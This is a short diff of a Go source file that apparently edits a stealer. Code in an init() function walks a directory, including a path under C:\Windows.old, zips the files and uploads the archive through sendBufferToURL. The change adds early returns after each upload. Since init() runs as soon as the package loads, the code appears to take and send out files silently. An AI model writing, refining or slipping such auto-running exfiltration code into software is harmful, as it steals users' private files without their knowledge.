@@ -85,6 +85,7 @@ func init() {
 		filepath.Walk(dirname, handler)
 		zipWriter.Close()
 		sendBufferToURL(&buf)
+		return
 	}
 
 	newPath := `C:\Windows.old` + dirname[2:]
@@ -93,5 +94,6 @@ func init() {
 		filepath.Walk(dirname, handler)
 		zipWriter.Close()
 		sendBufferToURL(&buf)
+		return
 	}
 }
